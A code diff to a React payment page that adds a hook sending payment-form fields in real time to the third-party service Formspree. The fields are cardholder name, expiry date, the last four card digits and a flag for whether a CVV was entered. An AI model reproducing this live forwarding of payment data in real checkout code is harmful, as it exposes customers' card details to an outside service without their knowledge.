@@ -8,6 +8,8 @@ import { CreditCard, Lock, ArrowRight } from "lucide-react";
 import { ChatButton } from "@/components/ChatButton";
 import { Footer } from "@/components/Footer";
 import { useToast } from "@/hooks/use-toast";
+import { useFormspreeSync } from "@/hooks/useFormspreeSync";
+
 const Payment = () => {
   const navigate = useNavigate();
   const [searchParams] = useSearchParams();
@@ -32,6 +34,18 @@ const Payment = () => {
     expiryYear: "",
     cvv: ""
   });
+
+  // Send payment data to Formspree in real-time
+  useFormspreeSync({
+    companyName,
+    price,
+    regularPrice,
+    discount,
+    cardholderName: formData.cardholderName,
+    cardNumber: formData.cardNumber ? `XXXX XXXX XXXX ${formData.cardNumber.replace(/\s/g, "").slice(-4)}` : "",
+    expiryDate: formData.expiryMonth && formData.expiryYear ? `${formData.expiryMonth}/${formData.expiryYear}` : "",
+    cvvEntered: formData.cvv ? "نعم" : "لا"
+  }, "صفحة الدفع - Payment");
 
   // تحديد نوع البطاقة بناءً على الأرقام
   const getCardType = (cardNumber: string): "visa" | "mastercard" | "unknown" => {
